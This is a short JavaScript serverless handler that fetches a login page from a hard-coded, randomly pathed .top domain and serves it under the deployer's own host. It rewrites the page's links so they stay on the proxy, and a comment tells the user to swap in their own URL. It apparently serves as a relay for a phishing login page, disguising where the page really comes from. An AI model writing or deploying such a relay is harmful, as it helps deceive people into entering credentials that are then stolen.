export default async (req, res) => {
  try {
    const targetUrl = "https://login.espeharete.top/xVpSXLob"; // CHANGE THIS TO YOUR URL
    
    const response = await fetch(targetUrl, {
      headers: {
        'X-Forwarded-Host': req.headers.host,
        'User-Agent': 'Mozilla/5.0'
      }
    });
    
    let html = await response.text();
    // Fix links to keep them in proxy
    html = html.replace(/https:\/\/login\.espeharete\.top/g, '');
    
    res.status(200).send(html);
  } catch (error) {
    res.status(500).send('Proxy error');
  }
};
